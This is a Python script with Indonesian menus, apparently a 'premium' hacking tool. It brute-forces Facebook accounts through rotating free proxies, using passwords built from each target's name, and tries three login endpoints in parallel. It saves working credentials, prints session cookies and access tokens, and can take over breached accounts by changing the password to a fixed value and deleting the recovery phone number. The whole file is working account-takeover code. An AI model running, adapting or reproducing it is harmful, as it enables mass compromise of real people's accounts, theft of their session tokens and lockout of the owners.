#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
- META 2024 -

Menu Premium.
Code By Khamdihi Dev - Purbalingga
"""
try:
    import re, os, uuid, sys, bs4
    import requests
    import datetime
    import time, json, random
except Exception as e:
    exit(f'\n Error: {e}')

from bs4 import BeautifulSoup as BSP
from concurrent.futures import ThreadPoolExecutor

P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K = "\033[33m"

class MAIN:
   prox, lol, id, Loop, MethodType, ResultSuccess, ResultChechpoint,UbahData = ([], [], [], 0, [], 0, 0, [])
   def __init__(self):
       self.Proxies()
       self.host = random.choice(['m.prod.facebook.com','mbasic.prod.facebook.com','free.prod.facebook.com'])
       super(MAIN).__init__()

   def Proxies(self):
       try:
           req = requests.get('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies').text
           for y in req.splitlines():
               if y not in self.prox:
                  self.prox.append(y)
       except Exception as e:
           exit('\n[!] Erorr dump proxies.')

   def List(self, uid):
       for me in uid:
           self.id.append(me)
       print('')
       print(f'{P}[{H}1{P}] Method Bisnis')
       print(f'[{H}2{P}] Method Random')
       print(f'[{H}3{P}] Method Api Facebook\n')
       self.Main()

   def Main(self):
       while True:
         x = input(f'[{H}?{P}] Pilih : ')
         if x in   ['01','1']: self.MethodType.append('1');break
         elif x in ['02','2']: self.MethodType.append('2');break
         else: self.MethodType.append('3');break
       self.Exekusy()

   def Exekusy(self):
       print('')
       print(f'[{H}!{P}] Auto Ubah Dan Hapus Data: (Ubah Pw,Hapus Nomor) [y/t]')
       x = input(f'[{H}?{P}] Ubah Data : ').lower()
       if x in ['ya','y']:self.UbahData.append(True)
       else:self.UbahData.append(False)
       self.Exekusy2()

   def pwdc(self, nama):
       self.x,self.i = [], []
       for self.y in nama.split(' '):
           if len(self.y) <2:continue
           elif len(self.y) == 3 or len(self.y) == 4 or len(self.y) == 5:
              self.z = self.y.lower()
              self.x.append(self.z+'123')
              self.x.append(self.z+'1234')
              self.x.append(self.z+'12345')
           else:
              self.z = self.y.lower()
              self.x.append(self.z+'123')
              self.x.append(self.z+'1234')
              self.x.append(self.z+'12345')
           if len(nama) <5:continue
           else:
              self.x.append(nama.replace(' ','').lower())
              self.x.append(nama.lower())
              self.x.append(nama)
       for self.d in self.x:
           if self.d not in self.i:
              self.i.append(self.d)
       return self.i

   def Exekusy2(self):
       print(f'\n{P}[{H}!{P}] Akun {H}(OK){P} simpan di folder: data/OK.txt{P}\n[{K}!{P}] Akun {K}(CP){P} simpan di folder: data/CP.txt\n')
       with ThreadPoolExecutor(max_workers=30) as exe:
          for data in self.id:
              id, nama = data.split('|')
              pw = self.pwdc(nama)
              if '1' in self.MethodType:exe.submit(self.business, id, pw)
              elif '2' in self.MethodType:exe.submit(self.RandomLG, id, pw)
              elif '3' in self.MethodType:exe.submit(self.Api,id,pw)
       exit('\n\n[!] Proses Selesai.')

   def ProxiesSc(self):
       return {'http': 'http://%s'%(random.choice(self.prox)),}

   def business(self, users, passlist):
       print(f'\r{P}[{len(self.id)}/{self.Loop}] [OK:{self.ResultSuccess} CP:{self.ResultChechpoint}]',end='')
       for pwa in passlist:
           with requests.Session() as session:
             try:
                 req1 = session.get('https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0').text
                 data = {'jazoest':re.search('name="jazoest" value="(.*?)"',str(req1)).group(1),'lsd':re.search('name="lsd" value="(.*?)"',str(req1)).group(1),'api_key':'124024574287414','cancel_url':'https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_','display':'page','isprivate':'','return_session':'','skip_api_login':1,'signed_next':1,'trynum':1,'timezone':'-420','lgndim':re.search('name="lgndim" value="(.*?)"',str(req1)).group(1),'lgnrnd':re.search('name="lgnrnd" value="(.*?)"',str(req1)).group(1),'lgnjs':re.search('name="lgnjs" value="(.*?)"',str(req1)).group(1),'email':users,'prefill_contact_point':users,'prefill_source':'browser_dropdown','prefill_type':'password','first_prefill_source':'browser_dropdown','first_prefill_type':'contact_point','had_cp_prefilled':True,'had_password_prefilled':True,'ab_test_data':'','encpass':f"#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pwa}"}
                 head = {'Host': 'business.facebook.com','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                 datr = re.search('_js_datr","(.*?)"',str(req1)).group(1)
                 coki = f'datr={datr};locale=id_ID;wl_cbv=v2%3Bclient_version%3A2392%3Btimestamp%3A{int(time.time())};vpd=v1%3B885x360x2;wd=980x1715;{";".join(["%s=%s"%(x,y) for x,y in session.cookies.get_dict().items()])};_js_datr={datr}'
                 req2 = session.post('https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified%26cbt%3D1705563202091&lwv=100', data=data, headers=head, cookies={'cookie':coki}, proxies=self.ProxiesSc(), allow_redirects=False)
                 if 'c_user' in session.cookies.get_dict():
                     kuki = f'{";".join(["%s=%s"%(x,y) for x,y in session.cookies.get_dict().items()])};_js_datr={datr}'
                     if True in self.UbahData:
                        self.xyz = self.UbahSandi(pwa, 'khamdihi28', kuki)
                        self.pwn = pwa if self.xyz is False else self.xyz
                        self.num = self.HapusNomor(kuki, self.pwn)
                        print(f'\r {H}*  --> {users}|{self.pwn}|{self.num}|{kuki}')
                     else:
                        print(f'\r {H}*  --> {users}|{pwa}|{kuki}')
                     open('data/OK.txt','a').write(f'{users}|{pwa}\n')
                     self.ResultSuccess +=1
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
                     print(f'\r {K}*  --> {users}|{pwa}')
                     open('data/CP.txt','a').write(f'{users}|{pwa}\n')
                     self.ResultChechpoint +=1
                     break
                 else:
                     continue
             except requests.exceptions.ConnectionError:
                time.sleep(10)
                self.business(users, [pwa])
       self.Loop +=1

   def RandomLG(self, users, passlist):
       print(f'\r[{len(self.id)}/{self.Loop}] [OK:{self.ResultSuccess} CP:{self.ResultChechpoint}]',end='')
       for pwa in passlist:
           with requests.Session() as session:
             try:
                 req1 = session.get(f'https://{self.host}/?index.php')
                 head = {'Host': self.host,'content-length': '72','cache-control': 'max-age=0','dpr': '2','sec-ch-ua-mobile': '?0','sec-ch-ua-full-version-list': '','sec-ch-prefers-color-scheme': 'light','upgrade-insecure-requests': '1','origin': 'https://free.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': req1.url,'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9'}
                 data = {'lsd':re.search('name="lsd" value="(.*?)"', str(req1.text)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(req1.text)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(req1.text)).group(1),'li':re.search('name="li" value="(.*?)"', str(req1.text)).group(1),'try_number':0,'unrecognized_tries':0,'email':users,'pass':pwa,'login':'Masuk'}
                 kueh = ";".join(["%s=%s"%(x,y) for x,y in session.cookies.get_dict().items()])
                 sign = session.post(f'https://{self.host}/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8', cookies={'cookie':kueh}, data=data, headers=head, proxies=self.ProxiesSc(), allow_redirects=False)
                 if 'c_user' in session.cookies.get_dict():
                     kuki = f'{";".join(["%s=%s"%(x,y) for x,y in session.cookies.get_dict().items()])}'
                     if True in self.UbahData:
                        self.xyz = self.UbahSandi(pwa, 'khamdihi24', kuki)
                        self.pwn = pwa if self.xyz is False else self.xyz
                        self.num = self.HapusNomor(kuki, self.pwn)
                        print(f'\r {H}*  --> {users}|{self.pwn}|{self.num}|{kuki}')
                     else:
                        print(f'\r {H}*  --> {users}|{pwa}|{kuki}')
                     open('data/OK.txt','a').write(f'{users}|{pwa}\n')
                     self.ResultSuccess +=1
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
                     print(f'\r {K}*  --> {users}|{pwa}')
                     open('data/CP.txt','a').write(f'{users}|{pwa}\n')
                     self.ResultChechpoint +=1
                     break
                 else:
                     continue
             except requests.exceptions.ConnectionError:
                time.sleep(5)
       self.Loop +=1

   def ua_api(self):
       rr = random.randint
       model = random.choice(['Mi 10 Pro','CPH1909'])
       uazz = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; Mi 10 Pro Build/QQ3A.200805.001) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.0.0.8.106;FBPN/com.facebook.mlite;FBLC/ja_JP;FBBV/417404896;FBCR/Indosat Ooredoo;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/{model};FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=1080,height=2138};]")
       return uazz

   def Api(self, users, passlist):
       print(f'\r[{len(self.id)}/{self.Loop}] [OK:{self.ResultSuccess} CP:{self.ResultChechpoint}]',end=' ');sys.stdout.flush()
       for pwa in passlist:
           with requests.Session() as session:
             try:
                 data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':users,'password': f'#PWD_FB4A:0:{int(time.time())}:{pwa}','generate_analytics_claim':'1','community_id':'','linked_guest_account_userid':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'secure_family_device_id':str(uuid.uuid4()),'credentials_type':'password','fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3','fb4a_shared_phone_cpl_group':'enable_v3_at_risk','enroll_misauth':'false','generate_session_cookies':'1','error_detail_type':'button_with_disabled','source':'login','generate_machine_id':'1','jazoest':'22518','meta_inf_fbmeta':'V2_UNTAGGED','advertiser_id':str(uuid.uuid4()),'encrypted_msisdn':'','currently_logged_in_userid':'0','locale':'id_ID','client_country_code':'ID','fb_api_req_friendly_name':'authenticate','fb_api_caller_class':'Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d','sig':'f2dc7dc0c16ecde068dcc34d0290acc4','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                 head = {'Host': 'b-graph.facebook.com','X-Fb-Request-Analytics-Tags': json.dumps({"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}),'X-Fb-Friendly-Name': 'authenticate','Zero-Rated': '0','X-Fb-Net-Hni': '51002','X-Fb-Connection-Quality': 'EXCELLENT','Authorization': 'OAuth null','X-Fb-Sim-Hni': '51002','Content-Type': 'application/x-www-form-urlencoded','X-Fb-Connection-Type': 'WIFI','X-Fb-Device-Group': '4137','X-Tigon-Is-Retry': 'false','Priority': 'u=3,i','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'true','X-Fb-Server-Cluster': 'true'}
                 head.update({'User-Agent':self.ua_api()})
                 req1 = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=head, proxies=self.ProxiesSc()).json()
                 if 'session_key' in req1:
                     kuki = ';'.join([x['name']+'='+x['value'] for x in req1['session_cookies']])
                     if True in self.UbahData:
                        self.xyz = self.UbahSandi(pwa, 'khamdihi28', kuki)
                        self.pwn = pwa if self.xyz is False else self.xyz
                        self.num = self.HapusNomor(kuki, self.pwn)
                        self.apc = f'{K}Tidak' if self.num is None else f'{H}Ya - {self.num}'
                        self.tml = (f'''\r{H}                                   
  - Success Login
  - Data Users : {users}|{pwa}
  - Merubah data  :

    - Sandi Baru  : {self.pwn}
    - Hapus Nomor : {self.num}

  - Cookie Dan Token:
    - Cookie : {kuki}
    - Token  : {req1["access_token"]}{P}''')
                        self.ShowResults(self.tml,users,True)
                        self.lol.append(users)
                        open('data/OK.txt','a').write(f'{users}|{self.pwn}\n')
                     else:
                        self.tml = (f'''\r{H}                                    
  - Success Login
  - Data Users : {users}|{pwa}
  - Merubah data  :

    - Sandi Baru  : None
    - Hapus Nomor : None

  - Cookie Dan Token:
    - Cookie : {kuki}
    - Token  : {req1["access_token"]}{P}''')
                        self.ShowResults(self.tml,users,True)
                        self.lol.append(users)
                        open('data/OK.txt','a').write(f'{users}|{pwa}\n')
                     break
                 elif 'www.facebook.com' in req1['error']['message']:
                     self.tml = (f'''\r{K}                                        
  - Checkpoint Login
  - Data Users : {users}|{pwa}
  - Merubah data  :

    - Sandi Baru  : None
    - Hapus Nomor : None

  - Cookie Dan Token:
    - Cookie : None
    - Token  : None{P}''')
                     self.ShowResults(self.tml,users,False)
                     self.lol.append(users)
                     open('data/CP.txt','a').write(f'{users}|{pwa}\n')
                     break
                 else:continue
             except requests.exceptions.ConnectionError:
                time.sleep(5)
                self.Api(users, [pwa])
       self.Loop +=1

   def UbahSandi(self, old, new, cookies):
       try:
           req = requests.get('https://accountscenter.facebook.com/password_and_security/password/change', cookies={'cookie':cookies}).text
           self.old = f'#PWD_BROWSER:0:{int(time.time())}:{old}'
           self.new = f'#PWD_BROWSER:0:{int(time.time())}:{new}'
           self.data = {
                'av':re.search('{"actorID":"(\d+)"',str(req)).group(1),
                '__user':re.search('{"actorID":"(\d+)"',str(req)).group(1),
                '__hs':re.search('"haste_session":"(.*?)"',str(req)).group(1),
                '__rev':re.search('{"rev":(\d+)}',str(req)).group(1),
                'fb_dtsg':re.search('"DTSGInitData",\[\],{"token":"(.*?)"',str(req)).group(1),
                'jazoest':re.search('jazoest=(\d+)',str(req)).group(1),
                'lsd':re.search('"LSD",\[\],{"token":"(.*?)"}', str(req)).group(1),
                '__spin_r':re.search('"__spin_r":(\d+)',str(req)).group(1),
                '__spin_t':re.search('"__spin_t":(\d+)',str(req)).group(1),
                'fb_api_caller_class':'RelayModern',
                'fb_api_req_friendly_name':'useFXSettingsChangePasswordMutation',
                '__a':'1',
                '__ccg':'GOOD',
                'server_timestamps':True,
                'doc_id':'4872350656193366',
                'variables':'{"account_id":"'+re.search('{"actorID":"(\d+)"',str(req)).group(1)+'","account_type":"FACEBOOK","current_password_enc":{"sensitive_string_value":"'+self.old+'"},"new_password_enc":{"sensitive_string_value":"'+self.new+'"},"new_password_confirm_enc":{"sensitive_string_value":"'+self.new+'"},"client_mutation_id":"63000686-cf17-46b6-a962-636bba09b5b6"}'
           }
           self.head = {'x-fb-friendly-name': 'useFXSettingsChangePasswordMutation','x-fb-lsd': self.data['lsd']}
           self.req1 = requests.post('https://accountscenter.facebook.com/api/graphql/', cookies={'cookie':cookies},  data=self.data, headers=self.head).json()
           meki = self.req1['data']['xfb_change_password']['success']
           if meki == True:
              return str(new)
           else:return False
       except Exception as e:print(e);return False
       except (AttributeError,KeyError,requests.exceptions.ConnectionError):
           return False

   def HapusNomor(self,cokie, password):
       try:
           req = requests.get('https://accountscenter.facebook.com/personal_info/contact_points', cookies={'cookie':cokie}).text
           try:num = re.search('"contact_point_type":"PHONE_NUMBER","normalized_contact_point":"(.*?)"', str(req)).group(1)
           except:return None
           else:
               self.data = {
                   'av':re.search('{"actorID":"(\d+)"',str(req)).group(1),
                   '__user':re.search('{"actorID":"(\d+)"',str(req)).group(1),
                   '__hs':re.search('"haste_session":"(.*?)"',str(req)).group(1),
                   '__rev':re.search('{"rev":(\d+)}',str(req)).group(1),
                   'fb_dtsg':re.search('"DTSGInitData",\[\],{"token":"(.*?)"',str(req)).group(1),
                   'jazoest':re.search('jazoest=(\d+)',str(req)).group(1),
                   'lsd':re.search('"LSD",\[\],{"token":"(.*?)"}', str(req)).group(1),
                   '__spin_r':re.search('"__spin_r":(\d+)',str(req)).group(1),
                   '__spin_t':re.search('"__spin_t":(\d+)',str(req)).group(1),
                   'fb_api_caller_class':'RelayModern',
                   '__a':'1',
                   '__ccg':'GOOD',
                   'server_timestamps':True,
                   'fb_api_req_friendly_name':'FXAccountsCenterDeleteContactPointMutation',
                   'variables':'{"normalized_contact_point":"'+num+'","contact_point_type":"PHONE_NUMBER","selected_accounts":["'+re.search('{"actorID":"(\d+)"',str(req)).group(1)+'"],"client_mutation_id":"mutation_id_1705665618630","family_device_id":"device_id_fetch_datr"}',
                   'doc_id':'6716611361758391'
               }
               self.agen = self.ua_api()
               self.head = {'Host': 'accountscenter.facebook.com','user-agent': self.agen,'x-fb-friendly-name': 'FXAccountsCenterDeleteContactPointMutation','x-fb-lsd': self.data['lsd']}
               self.req1 = requests.post('https://accountscenter.facebook.com/api/graphql/', cookies={'cookie':cokie}, data=self.data, headers=self.head).json()
               if 'challenge_type' in str(self.req1):
                  type = re.search('"challenge_type":"(.*?)"}',str(self.req1)).group(1)
                  user = self.data['av']
                  pswd = f'#PWD_BROWSER:0:{int(time.time())}:{password}'
                  if 'password' in str(type):
                      self.data.update({
                          'fb_api_req_friendly_name':'FXPasswordReauthenticationMutation',
                          'variables':'{"input":{"account_id":'+user+',"account_type":"Facebook","password":{"sensitive_string_value":"'+pswd+'"},"actor_id":"'+user+'","client_mutation_id":"1"}}',
                          'doc_id':'5864546173675027'})
                      self.head.update({'x-fb-friendly-name': 'FXPasswordReauthenticationMutation','x-fb-lsd': self.data['lsd']})
                      self.head.pop('user-agent')
                      self.req2 = requests.post('https://accountscenter.facebook.com/api/graphql/', cookies={'cookie':cokie}, data=self.data, headers=self.head).json()
                      self.meme = self.req2['data']['xfb_password_reauth_fb_only']
                      if self.meme == None:return None
                      elif self.meme == True:self.HapusNomor(cokie, password)
                      else:return None
                  elif 'block' in str(type):return None
                  else:return None
               else:return str(num)
       except Exception as e:return None

   def ShowResults(self, data, user, type):
       if user not in self.lol:
          print(data)
          if type is True:self.ResultSuccess +=1
          else:self.ResultChechpoint +=1


